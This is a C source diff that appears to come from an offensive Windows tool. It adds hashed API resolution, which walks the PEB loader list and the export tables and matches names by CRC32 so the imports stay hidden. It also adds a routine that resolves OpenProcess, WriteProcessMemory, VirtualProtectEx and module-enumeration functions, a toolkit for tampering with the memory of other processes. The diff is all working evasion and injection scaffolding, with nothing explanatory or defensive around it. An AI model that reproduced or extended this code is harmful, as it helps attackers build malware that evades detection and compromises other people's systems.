@@ -3,6 +3,8 @@
 #include "structs.h"
 #include "api.h"
 
+extern BOOL g_bVerbose;
+
 UINT32 CRC32BA(LPCSTR cStringA) {
     UINT32      uMask = 0x00;
     UINT32      uHash = 0x0BADC0DE;
@@ -43,9 +45,9 @@ HMODULE GetModuleHandleH(UINT32 uDllNameHash) {
 
             for (int i = 0; i < pLdrDataTableEntry->FullDllName.Length; i++) {
                 if (pLdrDataTableEntry->FullDllName.Buffer[i] >= 'a' && pLdrDataTableEntry->FullDllName.Buffer[i] <= 'z')
-                    cUprDllFileName[i] = pLdrDataTableEntry->FullDllName.Buffer[i] - 'a' + 'A';
+                    cUprDllFileName[i] = (CHAR)pLdrDataTableEntry->FullDllName.Buffer[i] - 'a' + 'A';
                 else
-                    cUprDllFileName[i] = pLdrDataTableEntry->FullDllName.Buffer[i];
+                    cUprDllFileName[i] = (CHAR)pLdrDataTableEntry->FullDllName.Buffer[i];
             }
 
             if (CRC32BA(cUprDllFileName) == uDllNameHash)
@@ -84,3 +86,33 @@ LPVOID GetProcAddressH(HMODULE hModule, DWORD dwProcHash) {
     return NULL;
 }
 
+BOOL InitializeWin32Api(PWIN32_API pWin32Api) {
+    HMODULE hKernel32 = NULL;
+
+    if (!(hKernel32 = GetModuleHandleH(KERNEL32_CRC32))) {
+        printf("[-] Failed to locate kernel32.dll\n");
+        return FALSE;
+    }
+
+    if (g_bVerbose == TRUE)
+        printf("[*] kernel32.dll base address: 0x%p\n", hKernel32);
+
+    pWin32Api->pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, LoadLibraryA_CRC32);
+    pWin32Api->pFreeLibrary = (fnFreeLibrary)GetProcAddressH(hKernel32, FreeLibrary_CRC32);
+    pWin32Api->pVirtualProtectEx = (fnVirtualProtectEx)GetProcAddressH(hKernel32, VirtualProtectEx_CRC32);
+    pWin32Api->pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressH(hKernel32, WriteProcessMemory_CRC32);
+    pWin32Api->pCreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)GetProcAddressH(hKernel32, CreateToolhelp32Snapshot_CRC32);
+    pWin32Api->pModule32FirstW = (fnModule32FirstW)GetProcAddressH(hKernel32, Module32FirstW_CRC32);
+    pWin32Api->pModule32NextW = (fnModule32NextW)GetProcAddressH(hKernel32, Module32NextW_CRC32);
+    pWin32Api->pCloseHandle = (fnCloseHandle)GetProcAddressH(hKernel32, CloseHandle_CRC32);
+    pWin32Api->pOpenProcess = (fnOpenProcess)GetProcAddressH(hKernel32, OpenProcess_CRC32);
+
+    if (!pWin32Api->pLoadLibraryA || !pWin32Api->pFreeLibrary || !pWin32Api->pVirtualProtectEx ||
+        !pWin32Api->pWriteProcessMemory || !pWin32Api->pCreateToolhelp32Snapshot || !pWin32Api->pModule32FirstW ||
+        !pWin32Api->pModule32NextW || !pWin32Api->pCloseHandle || !pWin32Api->pOpenProcess) {
+        printf("[-] Failed resolve one or more kernel32 functions\n");
+        return FALSE;
+    }
+
+    return TRUE;
+}
